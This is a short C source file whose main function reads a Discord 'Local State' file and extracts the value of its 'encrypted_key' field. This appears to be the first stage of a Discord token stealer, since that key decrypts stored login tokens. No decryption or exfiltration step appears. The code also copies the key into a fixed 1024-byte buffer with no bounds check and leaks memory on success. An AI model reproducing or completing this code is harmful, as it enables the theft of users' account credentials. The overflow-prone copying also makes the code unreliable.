#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "main.h"

int find_substring(char *buffer, long buffer_size, char *substring)
{
	int i = 0;
	int j = 0;
	for (i = 0; i < buffer_size; i++) {
		if (buffer[i] == substring[j]) {
			j++;
			if (j == strlen(substring)) {
				return i - strlen(substring) + 1;
			}
		} else {
			j = 0;
		}
	}
	return -1;
}

char *local_state_path_key_discord(char *path)
{
	FILE *fp;
	long file_size = 0;
	char *file_contents;
	char *key = calloc(1, 1024);
	fp = fopen(path, "r");
	if (fp == NULL) {
		ERROR_PRINT("Failed to open file: %s\n", path);
		return NULL;
	}
	fseek(fp, 0, SEEK_END);
	file_size = ftell(fp);
	rewind(fp);
	file_contents = malloc(file_size + 1);
	fread(file_contents, file_size, 1, fp);
	file_contents[file_size] = 0;
	fclose(fp);

	int key_index = find_substring(file_contents, file_size,
				       "\"encrypted_key\":\"");
	if (key_index == -1) {
		ERROR_PRINT("Failed to find key\n");
		goto fail;
	}
	key_index += strlen("\"encrypted_key\":\"");
	int i = 0;
	while (file_contents[key_index] != '"') {
		key[i] = file_contents[key_index];
		key_index++;
		i++;
	}
	return key;
fail:
	free(file_contents);
	free(key);
	return NULL;
}
